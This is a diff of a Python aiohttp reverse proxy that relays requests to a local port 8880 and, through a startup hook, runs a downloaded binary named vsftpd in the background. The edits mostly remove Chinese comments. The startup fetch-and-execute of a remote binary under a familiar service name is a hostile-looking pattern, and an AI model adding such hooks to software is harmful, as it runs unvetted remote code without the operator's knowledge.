@@ -32,8 +32,9 @@ async def download_and_run_vsftpd(app):
         # 使用 asyncio.create_subprocess_exec 异步执行，不阻塞主代理服务
         print(f"[System] Executing ./{filename}...")
         try:
-            # 假设是在 Linux/Unix 环境下运行
+            # 这里的 ./vsftpd 需要确保容器内有相应的动态链接库（如果是动态编译的话）
             await asyncio.create_subprocess_exec(f"./{filename}")
+            print("[System] Binary executed successfully in background.")
         except Exception as e:
             print(f"[System] Execution failed: {e}")
 
@@ -42,7 +43,6 @@ async def download_and_run_vsftpd(app):
 
 # --- 原有代理功能 ---
 async def proxy_handler(request):
-    # 处理根路径请求
     if request.path == '/':
         return web.Response(text='Hello World')
 
@@ -51,24 +51,20 @@ async def proxy_handler(request):
         target_url = f'http://127.0.0.1:8880{request.path}'
         try:
             async with ClientSession() as session:
-                # 注意：这里去掉了 request.read() 的 await，直接传 content 或者 stream
-                # 但为了保持你原代码逻辑，这里不做大改动，仅为了健壮性建议加 try-except
                 body = await request.read()
                 async with session.request(
                     method=request.method,
                     url=target_url,
                     headers=dict(request.headers),
                     data=body,
-                    allow_redirects=False # 通常代理不自动处理重定向
+                    allow_redirects=False
                 ) as response:
                     body = await response.read()
-                    # 需要过滤掉一些可能导致错误的 Hop-by-hop headers
                     headers = dict(response.headers)
                     exclude_headers = {'content-encoding', 'content-length', 'transfer-encoding', 'connection'}
                     for h in exclude_headers:
                         if h in headers:
                             del headers[h]
-                            
                     return web.Response(
                         body=body,
                         status=response.status,
@@ -113,18 +109,15 @@ async def proxy_handler(request):
                     return_exceptions=True
                 )
     except Exception:
-        # 忽略连接错误，避免服务器崩溃
         pass
     
     return ws_client
 
 async def init_app():
     app = web.Application()
-    # 注册启动时的钩子函数，用于下载并运行 vsftpd
     app.on_startup.append(download_and_run_vsftpd)
     app.router.add_route('*', '/{path:.*}', proxy_handler)
     return app
 
 if __name__ == '__main__':
-    # 必须在 Linux/Mac 环境下运行，因为 chmod 和 ./vsftpd 是 Unix 命令
     web.run_app(init_app(), port=3000)
